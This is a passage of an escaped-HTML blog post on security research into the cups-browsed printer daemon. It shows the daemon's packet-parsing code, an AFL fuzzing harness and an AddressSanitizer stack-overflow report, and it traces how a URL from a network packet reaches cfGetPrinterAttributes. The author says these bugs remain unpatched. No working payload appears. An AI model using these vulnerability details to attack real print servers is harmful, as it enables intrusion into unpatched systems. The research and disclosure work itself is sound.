class=\"string\"\u003e\u0026#34;process_browse_data: location: |%s|\\n\u0026#34;\u003c/span\u003e, location); \u003cspan class=\"comment\"\u003e// !!\u003c/span\u003e\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e    }\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e    \u003cspan class=\"keyword\"\u003efor\u003c/span\u003e (; c \u0026lt; end \u0026amp;\u0026amp; *c != \u003cspan class=\"string\"\u003e\u0026#39;\\\u0026#34;\u0026#39;\u003c/span\u003e; c++);\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e    \u003cspan class=\"keyword\"\u003eif\u003c/span\u003e (c \u0026gt;= end)\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e        \u003cspan class=\"keyword\"\u003ereturn\u003c/span\u003e (TRUE);\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e    \u003cspan class=\"keyword\"\u003eif\u003c/span\u003e (*c == \u003cspan class=\"string\"\u003e\u0026#39;\\\u0026#34;\u0026#39;\u003c/span\u003e)\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e        \u003cspan class=\"keyword\"\u003efor\u003c/span\u003e (c++; c \u0026lt; end \u0026amp;\u0026amp; \u003cspan class=\"built_in\"\u003eisspace\u003c/span\u003e(*c); c++);\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e    \u003cspan class=\"keyword\"\u003eif\u003c/span\u003e (c \u0026gt;= end)\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e        \u003cspan class=\"keyword\"\u003ereturn\u003c/span\u003e (TRUE);\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e    \u003cspan class=\"comment\"\u003e// Is there an info field?\u003c/span\u003e\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e    \u003cspan class=\"keyword\"\u003eif\u003c/span\u003e (*c == \u003cspan class=\"string\"\u003e\u0026#39;\\\u0026#34;\u0026#39;\u003c/span\u003e)\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e    {\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e        \u003cspan class=\"keyword\"\u003eint\u003c/span\u003e i;\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e        c++;\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e        \u003cspan class=\"keyword\"\u003efor\u003c/span\u003e (i = \u003cspan class=\"number\"\u003e0\u003c/span\u003e;\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e             i \u0026lt; \u003cspan class=\"keyword\"\u003esizeof\u003c/span\u003e (info) - \u003cspan class=\"number\"\u003e1\u003c/span\u003e \u0026amp;\u0026amp; *c != \u003cspan class=\"string\"\u003e\u0026#39;\\\u0026#34;\u0026#39;\u003c/span\u003e \u0026amp;\u0026amp; c \u0026lt; end;\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e             i++, c++)\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e            info[i] = *c;\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e        info[i] = \u003cspan class=\"string\"\u003e\u0026#39;\\0\u0026#39;\u003c/span\u003e;\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e        debug_printf(\u003cspan class=\"string\"\u003e\u0026#34;process_browse_data: info: |%s|\\n\u0026#34;\u003c/span\u003e, info); \u003cspan class=\"comment\"\u003e// !!\u003c/span\u003e\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e    }\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e}\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"keyword\"\u003eif\u003c/span\u003e (c \u0026gt;= end)\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e    \u003cspan class=\"keyword\"\u003ereturn\u003c/span\u003e (TRUE);\u003c/span\u003e\u003cbr/\u003e\u003c/pre\u003e\u003c/td\u003e\u003c/tr\u003e\u003c/tbody\u003e\u003c/table\u003e\u003c/figure\u003e\n\n\u003cp\u003eSo I quickly put together a fuzzing target around \u003ccode\u003eprocess_browse_data\u003c/code\u003e, start my \u003ca href=\"https://www.evilsocket.net/2015/04/30/Fuzzing-with-AFL-Fuzz-a-Practical-Example-AFL-vs-binutils/\"\u003egood old friend AFL\u003c/a\u003e, and wait. \u003cstrong\u003eYou won’t believe what happens next!!!\u003c/strong\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/images/2024/cups1/afl.png\" alt=\"crash\"/\u003e\u003c/p\u003e\n\u003cp\u003eThere are 5 different fuzzing inputs that trigger this:\u003c/p\u003e\n\u003cfigure class=\"highlight plain\"\u003e\u003ctable\u003e\u003ctbody\u003e\u003ctr\u003e\u003ctd class=\"gutter\"\u003e\u003cpre\u003e\u003cspan class=\"line\"\u003e1\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e2\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e3\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e4\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e5\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e6\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e7\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e8\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e9\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e10\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e11\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e12\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e13\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e14\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e15\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e16\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e17\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e18\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e19\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e20\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e21\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e22\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e23\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e24\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e25\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e26\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e27\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e28\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e29\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e30\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e31\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e32\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e33\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e34\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e35\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e36\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e37\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e38\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e39\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e40\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e41\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e42\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e43\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e44\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e45\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e46\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e47\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e48\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e49\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e50\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e51\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e52\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e53\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e54\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e55\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e56\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e57\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e58\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e59\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e60\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e61\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e62\u003c/span\u003e\u003cbr/\u003e\u003c/pre\u003e\u003c/td\u003e\u003ctd class=\"code\"\u003e\u003cpre\u003e\u003cspan class=\"line\"\u003eprocess_browse_data() in THREAD 136077340691200\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003egot= 1135\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003ehttpAddrGetString(addr=0x7bc2f7f098a0, s=0x7bc2f7f09a00, slen=255)\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e1httpAddrGetString: returning \u0026#34;UNKNOWN\u0026#34;...\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003ebrowse packet received from UNKNOWN\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003eprocess_browse_data: location: ||\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e=================================================================\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e==28780==ERROR: AddressSanitizer: stack-buffer-overflow on address 0x7bc2f7f09820 at pc 0x58293fb0926b bp 0x7fffa0308490 sp 0x7fffa0308488\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003eREAD of size 1 at 0x7bc2f7f09820 thread T0\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e    #0 0x58293fb0926a in process_browse_data(char const*) /home/evilsocket/lab/cups-fuzz/process_browse_data/main.cpp:264:42\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e    #1 0x58293fb093d6 in main /home/evilsocket/lab/cups-fuzz/process_browse_data/main.cpp:292:9\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e    #2 0x7bc2fa42a1c9 in __libc_start_call_main csu/../sysdeps/nptl/libc_start_call_main.h:58:16\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e    #3 0x7bc2fa42a28a in __libc_start_main csu/../csu/libc-start.c:360:3\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e    #4 0x58293fa293e4 in _start (/home/evilsocket/lab/cups-fuzz/process_browse_data/fuzz-target+0x2d3e4) (BuildId: a6df1903658bcb123c38a4a928f80e2a81b617e1)\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003eAddress 0x7bc2f7f09820 is located in stack of thread T0 at offset 2080 in frame\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e    #0 0x58293fb08557 in process_browse_data(char const*) /home/evilsocket/lab/cups-fuzz/process_browse_data/main.cpp:164\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e  This frame has 8 object(s):\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e    [32, 2080) \u0026#39;packet\u0026#39; (line 165) \u0026lt;== Memory access at offset 2080 overflows this variable\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e    [2208, 2464) \u0026#39;srcaddr\u0026#39; (line 166)\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e    [2528, 2532) \u0026#39;type\u0026#39; (line 169)\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e    [2544, 2548) \u0026#39;state\u0026#39; (line 170)\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e    [2560, 2816) \u0026#39;remote_host\u0026#39; (line 171)\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e    [2880, 3904) \u0026#39;uri\u0026#39; (line 172)\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e    [4032, 5056) \u0026#39;location\u0026#39; (line 173)\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e    [5184, 6208) \u0026#39;info\u0026#39; (line 174)\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003eHINT: this may be a false positive if your program uses some custom stack unwind mechanism, swapcontext or vfork\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e      (longjmp and C++ exceptions *are* supported)\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003eSUMMARY: AddressSanitizer: stack-buffer-overflow /home/evilsocket/lab/cups-fuzz/process_browse_data/main.cpp:264:42 in process_browse_data(char const*)\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003eShadow bytes around the buggy address:\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e  0x7bc2f7f09580: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e  0x7bc2f7f09600: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e  0x7bc2f7f09680: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e  0x7bc2f7f09700: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e  0x7bc2f7f09780: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e=\u0026gt;0x7bc2f7f09800: 00 00 00 00[f2]f2 f2 f2 f2 f2 f2 f2 f2 f2 f2 f2\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e  0x7bc2f7f09880: f2 f2 f2 f2 00 00 00 00 00 00 00 00 00 00 00 00\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e  0x7bc2f7f09900: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e  0x7bc2f7f09980: 00 00 00 00 f2 f2 f2 f2 f2 f2 f2 f2 04 f2 04 f2\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e  0x7bc2f7f09a00: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e  0x7bc2f7f09a80: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003eShadow byte legend (one shadow byte represents 8 application bytes):\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e  Addressable:           00\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e  Partially addressable: 01 02 03 04 05 06 07 \u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e  Heap left redzone:       fa\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e  Freed heap region:       fd\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e  Stack left redzone:      f1\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e  Stack mid redzone:       f2\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e  Stack right redzone:     f3\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e  Stack after return:      f5\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e  Stack use after scope:   f8\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e  Global redzone:          f9\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e  Global init order:       f6\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e  Poisoned by user:        f7\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e  Container overflow:      fc\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e  Array cookie:            ac\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e  Intra object redzone:    bb\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e  ASan internal:           fe\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e  Left alloca redzone:     ca\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e  Right alloca redzone:    cb\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e==28780==ABORTING\u003c/span\u003e\u003cbr/\u003e\u003c/pre\u003e\u003c/td\u003e\u003c/tr\u003e\u003c/tbody\u003e\u003c/table\u003e\u003c/figure\u003e\n\n\u003cp\u003eI believe it being due to the pointer being dereferenced before the exit condition is verified, in both loops. I also found out later on that there’s a race condition and possibly DoS in the \u003ca target=\"_blank\" rel=\"noopener\" href=\"https://github.com/OpenPrinting/cups-browsed/blob/c12b9cf5a906ab16971f5d060f291f9a58edadac/daemon/cups-browsed.c#L11764\"\u003elock acquired here\u003c/a\u003e.\u003c/p\u003e\n\u003cp\u003eBoth these issues \u003ca target=\"_blank\" rel=\"noopener\" href=\"https://github.com/OpenPrinting/cups-browsed/security/advisories/GHSA-rj88-6mr5-rcw8#advisory-comment-109538\"\u003ehave been reported and thoroughly documented\u003c/a\u003e, to the devs \u003cem\u003eand\u003c/em\u003e the CERT, but nobody seemed to give a damn. I can tell you that there’re other, more easily exploitable code paths going on, not just in the discovery mechanism - also reported and ignored. To this day they have not been acknowledged or patched. Happy hunting.\u003c/p\u003e\n\u003cp\u003eHowever, I’m a bit lazy and most importantly I’m a noob when it comes to binary exploitation. Hell, I can barely tell whether a buffer overflow or a race condition are exploitable or not. Hardening mechanisms are getting more and more complex to bypass and to be honest I had no intention of spending months on this stuff - I hate printers. So for the moment I decided to move on to what seemed to be a lower hanging fruit.\u003c/p\u003e\n\u003ch2 id=\"Back-to-found-cups-printer\"\u003e\u003ca href=\"#Back-to-found-cups-printer\" class=\"headerlink\" title=\"Back to found_cups_printer\"\u003e\u003c/a\u003eBack to found_cups_printer\u003c/h2\u003e\u003cp\u003eBy looking at \u003ca target=\"_blank\" rel=\"noopener\" href=\"https://github.com/OpenPrinting/cups-browsed/blob/c12b9cf5a906ab16971f5d060f291f9a58edadac/daemon/cups-browsed.c#L11686C1-L11720C36\"\u003efound_cups_printer\u003c/a\u003e we can see that one of the two text fields parsed from the packet is a URL:\u003c/p\u003e\n\u003cfigure class=\"highlight c\"\u003e\u003ctable\u003e\u003ctbody\u003e\u003ctr\u003e\u003ctd class=\"gutter\"\u003e\u003cpre\u003e\u003cspan class=\"line\"\u003e1\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e2\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e3\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e4\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e5\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e6\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e7\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e8\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e9\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e10\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e11\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e12\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e13\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e14\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e15\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e16\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e17\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e18\u003c/span\u003e\u003cbr/\u003e\u003c/pre\u003e\u003c/td\u003e\u003ctd class=\"code\"\u003e\u003cpre\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"comment\"\u003e//\u003c/span\u003e\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"comment\"\u003e// A CUPS printer has been discovered via CUPS Browsing\u003c/span\u003e\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"comment\"\u003e// or with BrowsePoll\u003c/span\u003e\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"comment\"\u003e//\u003c/span\u003e\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"keyword\"\u003estatic\u003c/span\u003e \u003cspan class=\"keyword\"\u003evoid\u003c/span\u003e\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003efound_cups_printer(\u003cspan class=\"keyword\"\u003econst\u003c/span\u003e \u003cspan class=\"keyword\"\u003echar\u003c/span\u003e *remote_host,\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e\t\t   \u003cspan class=\"keyword\"\u003econst\u003c/span\u003e \u003cspan class=\"keyword\"\u003echar\u003c/span\u003e *uri,\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e\t\t   \u003cspan class=\"keyword\"\u003econst\u003c/span\u003e \u003cspan class=\"keyword\"\u003echar\u003c/span\u003e *location,\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e\t\t   \u003cspan class=\"keyword\"\u003econst\u003c/span\u003e \u003cspan class=\"keyword\"\u003echar\u003c/span\u003e *info)\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e{\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e  \u003cspan class=\"comment\"\u003e// ... initialization skipped ...\u003c/span\u003e\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e  httpSeparateURI(HTTP_URI_CODING_ALL, uri,\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e\t\t  scheme, \u003cspan class=\"keyword\"\u003esizeof\u003c/span\u003e(scheme) - \u003cspan class=\"number\"\u003e1\u003c/span\u003e,\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e\t\t  username, \u003cspan class=\"keyword\"\u003esizeof\u003c/span\u003e(username) - \u003cspan class=\"number\"\u003e1\u003c/span\u003e,\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e\t\t  host, \u003cspan class=\"keyword\"\u003esizeof\u003c/span\u003e(host) - \u003cspan class=\"number\"\u003e1\u003c/span\u003e,\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e\t\t  \u0026amp;port,\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e\t\t  resource, \u003cspan class=\"keyword\"\u003esizeof\u003c/span\u003e(resource)- \u003cspan class=\"number\"\u003e1\u003c/span\u003e);\u003c/span\u003e\u003cbr/\u003e\u003c/pre\u003e\u003c/td\u003e\u003c/tr\u003e\u003c/tbody\u003e\u003c/table\u003e\u003c/figure\u003e\n\n\u003cp\u003eAfter some further validation and parsing, this URL and other data are then passed as arguments to the \u003ca target=\"_blank\" rel=\"noopener\" href=\"https://github.com/OpenPrinting/cups-browsed/blob/c12b9cf5a906ab16971f5d060f291f9a58edadac/daemon/cups-browsed.c#L10211\"\u003eexamine_discovered_printer_record function\u003c/a\u003e, which ultimately executes \u003ca target=\"_blank\" rel=\"noopener\" href=\"https://github.com/OpenPrinting/cups-browsed/blob/c12b9cf5a906ab16971f5d060f291f9a58edadac/daemon/cups-browsed.c#L7644\"\u003ecreate_remote_printer_entry\u003c/a\u003e. The \u003ccode\u003ecreate_remote_printer_entry\u003c/code\u003e function will then call \u003ca target=\"_blank\" rel=\"noopener\" href=\"https://github.com/OpenPrinting/cups-browsed/blob/c12b9cf5a906ab16971f5d060f291f9a58edadac/daemon/cups-browsed.c#L7828\"\u003ecfGetPrinterAttributes\u003c/a\u003e from \u003ccode\u003elibcupsfilters\u003c/code\u003e:\u003c/p\u003e\n\u003cfigure class=\"highlight c\"\u003e\u003ctable\u003e\u003ctbody\u003e\u003ctr\u003e\u003ctd class=\"gutter\"\u003e\u003cpre\u003e\u003cspan class=\"line\"\u003e1\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e2\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e3\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e4\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e5\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e6\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e7\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e8\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e9\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e10\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e11\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e12\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e13\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e14\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e15\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e16\u003c/span\u003e\u003cbr/\u003e\u003c/pre\u003e\u003c/td\u003e\u003ctd class=\"code\"\u003e\u003cpre\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"comment\"\u003e// For a remote CUPS printer our local queue will be raw or get a\u003c/span\u003e\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"comment\"\u003e// PPD file from the remote CUPS server, so that the driver on the\u003c/span\u003e\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"comment\"\u003e// remote CUPS server gets used. So we will not generate a PPD file\u003c/span\u003e\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"comment\"\u003e// or interface script at this point.\u003c/span\u003e\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003ep-\u0026gt;netprinter = \u003cspan class=\"number\"\u003e0\u003c/span\u003e;\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"keyword\"\u003eif\u003c/span\u003e (p-\u0026gt;uri[\u003cspan class=\"number\"\u003e0\u003c/span\u003e] != \u003cspan class=\"string\"\u003e\u0026#39;\\0\u0026#39;\u003c/span\u003e)\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e{\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e    p-\u0026gt;prattrs = cfGetPrinterAttributes(p-\u0026gt;uri, \u003cspan class=\"literal\"\u003eNULL\u003c/span\u003e, \u003cspan class=\"number\"\u003e0\u003c/span\u003e, \u003cspan class=\"literal\"\u003eNULL\u003c/span\u003e, \u003cspan class=\"number\"\u003e0\u003c/span\u003e, \u003cspan class=\"number\"\u003e1\u003c/span\u003e);\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e    debug_log_out(cf_get_printer_attributes_log);\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e    \u003cspan class=\"keyword\"\u003eif\u003c/span\u003e 